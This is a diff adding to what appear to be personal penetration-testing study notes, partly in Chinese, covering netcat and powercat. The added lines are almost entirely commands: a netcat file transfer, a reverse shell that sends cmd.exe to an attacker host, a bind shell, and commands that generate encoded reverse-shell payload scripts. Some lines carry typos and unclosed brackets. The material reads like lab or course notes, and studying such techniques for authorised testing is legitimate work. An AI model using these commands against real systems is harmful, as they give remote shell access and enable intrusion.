@@ -60,3 +60,26 @@ powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4
 linux 下运行
 nc -nv 10.11.0.22(windowsip 443
 
+powercat
+linux
+sudo nc -lvvp 443 > receiving_powercat.ps1
+powercat -c 10.11.0.4(linuxip -p 443 -i c:\demo\powercat.ps1
+
+reverse shell
+linux 
+sudo nc -lvvp 443 
+windows
+powercat -c <linux_ip> -p <port> -e cmd.exe
+
+bind shell
+windows
+powercat -l -p 443 -e cmd.exe
+linux 
+nc -nv widowsip 443
+
+linux 
+nc -lnvp 443
+windows
+powercat -c linuxip(10.11.0.4 -p 443 -e cmd.exe -g > reverse_shell.ps1
+or
+powercat -c <attacker_ip> -p <port) -e cmd.exe -ge > revershell.ps1
